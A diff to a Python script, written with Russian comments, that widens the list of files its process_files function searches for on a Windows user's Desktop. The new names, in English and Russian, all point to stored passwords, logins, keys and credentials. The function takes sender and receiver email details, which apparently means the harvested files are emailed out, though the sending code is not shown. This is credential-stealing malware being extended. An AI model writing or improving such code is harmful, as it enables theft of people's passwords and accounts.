@@ -28,10 +28,12 @@ def hash_string(string):
 def process_files(sender_email, password, receiver_email):
     desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
     files_to_search = ['pass.txt', 'password.txt', 'passwords.txt', 'пароли.txt',
-                       'file1.txt', 'file2.txt', 'file3.txt', 'file4.txt',
-                       'file5.txt', 'file6.txt', 'file7.txt', 'file8.txt',
-                       'file9.txt', 'file10.txt', 'file11.txt', 'file12.txt',
-                       'file13.txt', 'file14.txt', 'file15.txt', 'file16.txt'] # Добавьте другие файлы, которые вы хотите проверить
+                       'password_list.txt', 'passwd.txt', 'credentials.txt', 'logins.txt',
+                       'accounts.txt', 'key.txt', 'keys.txt', 'usernames.txt',
+                       'secret.txt', 'login.txt', 'pass_list.txt', 'credentials_list.txt',
+                       'password_storage.txt', 'access.txt', 'доступ.txt', 'пароли_и_логины.txt',
+                       'список_паролей.txt', 'учетные_данные.txt', 'логины_и_пароли.txt',
+                       'секреты.txt', 'коды_доступа.txt', 'ключи_для_входа.txt', 'конфиденциальные_данные.txt']
 
     for file_name in files_to_search:
         file_path = os.path.join(desktop_path, file_name)
